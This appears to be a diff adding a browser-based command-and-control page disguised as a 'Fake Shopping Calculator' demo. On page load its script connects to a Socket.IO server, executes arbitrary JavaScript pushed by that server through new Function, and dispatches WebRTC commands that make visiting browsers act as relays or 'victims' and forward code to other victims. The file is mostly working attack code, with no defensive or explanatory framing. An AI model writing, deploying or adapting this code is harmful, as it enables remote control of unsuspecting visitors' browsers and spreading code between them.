@@ -1,0 +1,90 @@
+<!-- working_c2_browser_pixel.html - Refactored with modular WebRTC -->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Demo Page</title>
+  <script src="/socket.io/socket.io.js"></script>
+  <script src="/js/webrtc-c2.js"></script>
+</head>
+<body>
+
+<!-- C2 Status Display -->
+<div id="c2-log" style="position:fixed;top:10px;right:10px;background:#222;color:#00ff00;padding:8px;font-family:monospace;z-index:999999;display:none;max-width:300px;font-size:12px;"></div>
+
+<!-- Demo UI -->
+<div style="padding:20px; font-family:sans-serif; max-width:600px;">
+  <h2>🛒 Fake Shopping Calculator</h2>
+  <p>Click the button to add items (5 + 5):</p>
+  <button id="calcBtn">Calculate Total</button>
+  <p id="result" style="margin-top:10px; font-weight:bold;"></p>
+</div>
+
+<script>
+  // === TARGET FUNCTION (will be hijacked) ===
+  window.add = function(a, b) {
+    return a + b;
+  };
+
+  // === UI LOGIC ===
+  document.getElementById('calcBtn').addEventListener('click', () => {
+    try {
+      const result = window.add(5, 5);
+      document.getElementById('result').innerText = `5 + 5 = ${result}`;
+    } catch (e) {
+      document.getElementById('result').innerText = `❌ Error: ${e.message}`;
+    }
+  });
+
+  // === C2 INFRASTRUCTURE ===
+  const logEl = document.getElementById('c2-log');
+  
+  window.showC2Msg = (msg) => {
+    logEl.innerText = '[BROWSER C2]\n' + msg;
+    logEl.style.display = 'block';
+    console.log('[C2]', msg);
+  };
+
+  // Initialize Socket.IO
+  const socket = io();
+
+  // Initialize WebRTC C2 module
+  const webrtcC2 = new WebRTCC2(socket, (msg) => {
+    console.log('[WebRTC Msg]', msg);
+  });
+
+  // === SOCKET EVENT HANDLERS ===
+  
+  // Direct JS execution from server
+  socket.on('execute', (jsCode) => {
+    try {
+      const f = new Function(jsCode);
+      f();
+    } catch (e) {
+      showC2Msg('❌ JS Error: ' + e.message);
+    }
+  });
+
+  // C2 command dispatcher
+  socket.on('c2_command', (cmd) => {
+    switch (cmd.action) {
+      case 'become_relay':
+        webrtcC2.becomeRelay();
+        break;
+      case 'become_victim':
+        webrtcC2.becomeVictim();
+        break;
+      case 'send_to_victim':
+        webrtcC2.sendToVictim(cmd.code);
+        break;
+      default:
+        console.log('[C2] Unknown command:', cmd.action);
+    }
+  });
+
+  // Signal ready
+  socket.emit('browser_ready');
+  console.log('[C2] Browser C2 initialized, waiting for commands...');
+</script>
+
+</body>
+</html>
